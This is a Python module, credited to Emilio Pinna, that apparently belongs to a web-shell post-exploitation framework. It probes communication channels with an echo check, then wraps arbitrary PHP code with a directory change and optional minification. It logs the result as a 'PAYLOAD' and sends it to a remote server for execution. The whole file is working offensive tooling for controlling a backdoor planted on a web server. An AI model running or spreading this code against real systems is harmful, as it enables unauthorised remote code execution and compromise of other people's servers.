from mako.template import Template
from core.module import Module, Status
from core import messages
from core.channels.channel import Channel
from core import config
from core.loggers import log
import random
import utils

class Php(Module):

    """Execute PHP commands."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : 'command', 'help' : 'PHP code wrapped in quotes and terminated by semi-comma', 'nargs' : '+' },
          { 'name' : '-prefix-string', 'default' : '' },
          { 'name' : '-post_data' },
          { 'name' : '-postfix-string', 'default' : '' },
        ])

        self.channel = None

    def _check_interpreter(self, channel):

        rand = str(random.randint(11111, 99999))

        command = 'echo(%s);' % rand
        response, code, error = channel.send(command)

        if rand == response:
            status = Status.RUN
        else:
            # The PHP shell should never return FAIL
            status = Status.IDLE

        return status


    def setup(self):
        """Instauration of the PHP channel. Returns the module status."""

        # Try a single channel if is manually set, else
        # probe every the supported channel from config
        if self.session.get('channel'):
            channels = [ self.session['channel'] ]
        else:
            channels = config.channels

        for channel_name in channels:

            channel = Channel(
                channel_name = channel_name,
                session = self.session
            )

            status = self._check_interpreter(channel)

            if status == Status.RUN:
                self.session['channel'] = channel_name
                self.channel = channel
                break

        log.debug(
            'PHP setup %s %s' % (
                'running' if status == Status.RUN else 'failed',
                'with %s channel' % (channel_name) if status == Status.RUN else ''
            )
        )

        return status

    def run(self):
        """ Run module """

        # This is an unusual slack setup at every execution
        # to check and eventually instance the proper channel
        if self.session['shell_php'].get('status') != Status.RUN: self.setup()

        cwd = self._get_stored_result('cwd', module = 'file_cd', default = '.')
        chdir = '' if cwd == '.' else "chdir('%s');" % cwd

        # Compose command with cwd, pre_command, and post_command option.
        self.args.update({ 'chdir' : chdir })
        command = Template("""${chdir}${prefix_string}${ ' '.join(command) }${postfix_string}""").render(**self.args)

        # Minify PHP payload.
        #
        # In case of error, modify session minify variable and
        # return original code.
        if self.session['shell_php']['stored_args'].get('minify', True):
            minified = utils.code.minify_php(command)
            self.session['shell_php'][
                        'stored_args'][
                        'minify'] = bool(minified)
            command = minified if minified else command

        log.debug('PAYLOAD %s' % command)

        # Send command
        response, code, error = self.channel.send(command)

        # Strip last newline if present
        return response
